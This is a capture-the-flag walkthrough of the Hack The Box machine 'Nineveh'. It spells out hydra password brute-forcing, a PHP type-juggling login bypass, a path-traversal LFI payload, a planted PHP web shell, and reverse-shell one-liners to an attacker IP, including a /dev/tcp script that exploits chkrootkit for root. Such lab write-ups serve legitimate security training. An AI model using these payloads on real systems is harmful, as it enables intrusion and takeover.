# Nineveh

**Machine ip:** 10.10.10.43

## Enumeration
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.43 -e tun0 > ports`
+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sudo nmap -Pn -sV -sC -p$ports 10.10.10.43`
+ `sudo nmap -Pn -sV -sC -sU -p$ports 10.10.10.43`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b0a28bb0-1ce5-4555-b8ea-43c6cb74d925)

+ `nineveh.htb` subdomain discovered.
+ Add: `echo "10.10.10.43 nineveh.htb" >> /etc/hosts`
+ Check for subdomains, and there is nothing.
```
wfuzz -c -u http://10.10.10.43/ -H "Host: FUZZ.nineveh.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 178
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/74415df0-f7e4-44e6-bf1c-6f634abeb157)

+ **Firstly**, navigate to `http://nineveh.htb/`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c2011036-a4ab-432c-a4ad-ff243b9dcd85)

+ Directory fuzzing:
```
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://nineveh.htb/ -x asp,aspx,cgi,htm,html,js,json,jsp,php,pl,py,sh -b 403,404
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6e68ff8c-ecb5-49c5-9e96-bf3c5facc224)

+ Navigate to `http://nineveh.htb/department/login.php`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ef0dda2e-fd83-4edf-bcce-864d10ac9c29)

+ Page view source. **admin** and **amrois** users discovered on **http://nineveh.htb/department/login.php**

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2ffc5eeb-eb9f-46a3-a9f2-e1dc57192d63)

+ Enumerate users: **admin** is valid, and **amrois** is invalid.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/52055f07-ffa7-4897-b6f9-bf5008c487be)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/02475b5c-f269-4172-9890-045056c6cea8)

+ Brute force using the wordlist: `/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000.txt`
```
hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64 -f
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e7a8f92b-97ca-4876-8cd3-84091385722d)

+ `admin`:`1q2w3e4r5t` credentials discovered on **http://nineveh.htb/department/login.php**

+ **Alternatively**, fill out `admin` for username, and **inspect** for password to add `[]` into value `name="password[]"`.
+ For more, check [1](https://book.hacktricks.xyz/pentesting-web/login-bypass#bypass-regular-login)  [2](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp).
+ Search about [PHP comparisons error exploit and php login bypass type juggling](https://benheater.com/hackthebox-nineveh/#More+Enumeration).
+ Click login button, and login without authentication.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/47354141-5b8d-4739-a9f1-33934d06fd69)

+ **Secondly**, navigate to `https://nineveh.htb/`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/27f0d95d-b1e2-4e72-b56d-b8746e2e7505)

+ Check SSL certificate status: `curl https://nineveh.htb/ -vkI`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bf1f60d7-c3fd-40ba-81f1-7891c0b4b2f7)

+ `admin` username discovered on **https://nineveh.htb/db/**

+ Directory fuzzing:
```
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u https://nineveh.htb/ -x php,htm,html -b 403,404 -k
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/34694892-72fd-468e-80f8-28492c074369)

+ Navigate to `https://nineveh.htb/db/`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7e71e97a-0e14-4f5d-9b7d-65f8b6759cd5)

+ `searchsploit phpliteadmin 1.9`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4c1cf7ee-61d0-4f0e-bab8-46f67b876537)

+ [PHPLiteAdmin 1.9.3 - Remote PHP Code Injection requires authentication](https://www.exploit-db.com/exploits/24044)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d9322e69-d1ee-4397-8419-26f919a5e2a5)

+ Capture the login request on Burp proxy.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/810117ad-cc91-492e-a8a8-bd2c8ee34b80)

+ Send to intruder, and set the payloads.
+ Brute force using the wordlist: `/usr/share/seclists/Passwords/twitter-banned.txt`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5725fbfc-755a-438c-8500-071ee78463e5)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/55fafbd0-eb21-431a-be79-3db22feed399)

+ **Alternatively**, crack using hydra:
```
hydra -l admin -P /usr/share/seclists/Passwords/twitter-banned.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true&F:Incorrect password." -f
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/727cd546-f846-4e1b-ac47-3994d89013bd)

+ `admin` username and `password123` password discovered on **https://nineveh.htb/db/**

## Gaining Access
+ Navigate to `http://nineveh.htb/department/login.php`
+ Loging with credentials `admin`:`1q2w3e4r5t`
+ Navigate to `http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt`
+ Check the path whether is vulnerable to LFI.
+ Use the LFI payload: `../../../../../../../etc/passwd`
```
http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../etc/passwd

http://nineveh.htb/department/manage.php?notes=/ninevehNotes.txt../../../../../../../etc/passwd
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d6c83b59-310c-4bf9-8d2f-94b4d6771a15)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4a8c5328-264a-4fa1-8c3a-bab57c4e932b)

+ Keep going on chain.

+ Okay go back to [PHPLiteAdmin 1.9.3 - Remote PHP Code Injection requires authentication](https://www.exploit-db.com/exploits/24044) on **https://nineveh.htb/db/** again.
+ Login with `password123`
+ Create new database.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a511a89f-9e10-49dd-b1fa-134d3c64f2e9)

+ Create new table and go.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3bef59a1-f7cd-4e47-91d6-40712f3933b8)

+ Fill out field and default value, then create.
+ `<?php echo system($_REQUEST["cmd"]); ?>` payload for create.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/88cb1f74-3847-45f5-a6e5-e68caaa0a9d0)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e727b1cf-9c79-4476-95a5-44f07e721400)

+ Navigate to `http://nineveh.htb/department/manage.php?notes=/ninevehNotes.txt../../../../../../../etc/passwd` for **/var/tmp/try.php**

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/840b2abb-ea07-404a-8182-00ed1357adf5)

+ Change the file and payload:
```
http://nineveh.htb/department/manage.php?notes=/ninevehNotes.txt/../../../../var/tmp/try.php&cmd=id;ls;pwd
```

+ The code executed.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/52b322d4-6962-4189-93e7-e4097102cfb9)

+ Reverse shell payload `php -r '$sock=fsockopen("10.10.14.18",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`
+ [url encoding](https://www.url-encode-decode.com/) the payload:
```
php+-r+%27%24sock%3Dfsockopen%28%2210.10.14.18%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27
```

+ Start listener: `nc -lnvp 4444` on your attack machine.
+ Execute command:
```
http://nineveh.htb/department/manage.php?notes=/ninevehNotes.txt/../../../../var/tmp/try.php&cmd=php+-r+%27%24sock%3Dfsockopen%28%2210.10.14.18%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27
```

+ Get shell.
+ Stable shell:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
script /dev/null -c bash
CTRL^Z
stty raw -echo; fg
reset
terminal type? xterm
export TERM=xterm  
export SHELL=bash
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bffc80ba-8ed6-4c9a-99d4-8ca0c6533fd1)

+ **www-data** doesn't have read permission: `ls -l /home/amrois/`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ca14a5be-2b4c-4845-a4bf-df1920bf9209)


## Privilege Escalation
+ Transfer pspy [1](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64) [2](https://vk9-sec.com/how-to-enumerate-services-in-use-with-pspy/) to the target.
+ `./pspy64`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a68cfde5-7600-4d85-b71a-28f878eb0eed)

+ **chkrootkit** is being run every minute.
+ `searchsploit chkrootkit`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bbb4ab93-c571-4d45-8041-e168353a382a)

+ [CVE-2014-0476](https://www.exploit-db.com/exploits/33899)

+ Create **update** file in /tmp directory.
+ Add this reverse payload into the **update** file.
```
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.18/5555 0>&1
```

+ `chmod +x update`
+ Start listener on your attack machine: `nc -lnvp 5555`
+ Get root shell.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/fd0fdf8a-98b4-43b5-af22-3482b41eafe9)

# References & Alternatives
Try ssh connection [analyzing **secure_notes** image file](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/nineveh-writeup-w-o-metasploit#id-7b47) and port knocking [1](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/nineveh-writeup-w-o-metasploit#id-7b47)  [2](https://benheater.com/hackthebox-nineveh/#knock-on-the-door)  [3-chisel](https://benheater.com/hackthebox-nineveh/#port-knock-workaround-chisel) methods for more alternatives.
+ https://vvmlist.github.io/#nineveh
+ https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html
+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/nineveh-writeup-w-o-metasploit
+ https://benheater.com/hackthebox-nineveh/
+ https://systemweakness.com/htb-nineveh-writeup-8cf43e5a605d
+ https://ethicalhacs.com/nineveh-hackthebox-walkthrough/
+ https://v3ded.github.io/ctf/htb-nineveh
+ https://steflan-security.com/hack-the-box-nineveh-walkthrough/


# Technical Knowledge
+ **procmon.sh:** https://github.com/ivanitlearning/CTF-Repos/blob/master/HTB/Friendzone/Failed-procmon.md
+ **IppSec's Video:** https://www.youtube.com/watch?v=K9DKULxSBK4&t=1890s

